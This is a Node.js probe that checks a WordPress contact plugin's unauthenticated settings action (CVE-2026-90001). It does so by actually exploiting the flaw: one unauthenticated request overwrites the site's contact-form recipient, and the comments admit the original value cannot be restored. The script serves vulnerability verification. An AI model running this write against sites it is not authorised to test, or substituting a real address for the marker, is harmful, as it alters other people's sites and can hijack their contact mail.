// Exploit-verification probe: Quick Contact <= 1.0.0 missing authorization
// on the unauthenticated qc_save_settings AJAX action (CVE-2026-90001).
//
// Usage: node probe.mjs <base-url>
// Exit codes:
//   0 = target IS vulnerable (unauthenticated request changed qc_recipient)
//   1 = target is NOT vulnerable (request was rejected)
//   2 = probe could not reach a verdict (usage error or transport failure)
//
// Only sends HTTP requests to the base URL given on the command line.
// Writes nothing to the local filesystem. Uses Node built-ins only.

const base = process.argv[2];
if (!base) {
  console.error('usage: node probe.mjs <base-url>');
  process.exit(2);
}

let target;
try {
  target = new URL(base);
  if (target.protocol !== 'http:' && target.protocol !== 'https:') {
    throw new Error('unsupported protocol');
  }
} catch (err) {
  console.error(`invalid base URL: ${err.message}`);
  process.exit(2);
}

const endpoint = new URL('/wp-admin/admin-ajax.php', target);

// Unique, syntactically valid marker so the write is distinguishable from
// any real configuration. sanitize_email() on the server would reduce an
// invalid address to '', which would make the check meaningless.
const marker = `qc-probe-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}@example.com`;

async function saveRecipient(value) {
  const body = new URLSearchParams({
    action: 'qc_save_settings',
    recipient: value,
  });
  const res = await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body,
    redirect: 'manual',
    signal: AbortSignal.timeout(15000),
  });
  const text = await res.text();
  return { status: res.status, text };
}

let result;
try {
  result = await saveRecipient(marker);
} catch (err) {
  console.error(`transport error contacting target: ${err.message}`);
  process.exit(2);
}

// The vulnerable handler returns wp_send_json_success() with no auth check.
// A patched handler rejects an unauthenticated/nonce-less request, so it
// should not return a JSON success payload.
let parsed = null;
try {
  parsed = JSON.parse(result.text);
} catch {
  parsed = null;
}

const vulnerable =
  result.status === 200 && parsed !== null && parsed.success === true;

if (vulnerable) {
  console.log(`VULNERABLE: unauthenticated qc_save_settings accepted (HTTP ${result.status}).`);
  console.log(`  Submitted recipient marker: ${marker}`);
  // Restoration: the original qc_recipient value cannot be read without
  // authentication (no unauthenticated read path exists), so it cannot be
  // restored from here. The option now holds the probe marker.
  console.log('  Note: original qc_recipient could not be restored (no unauthenticated read path).');
  process.exit(0);
} else {
  console.log(`NOT VULNERABLE: unauthenticated qc_save_settings rejected (HTTP ${result.status}).`);
  console.log(`  Response: ${result.text.slice(0, 200)}`);
  process.exit(1);
}
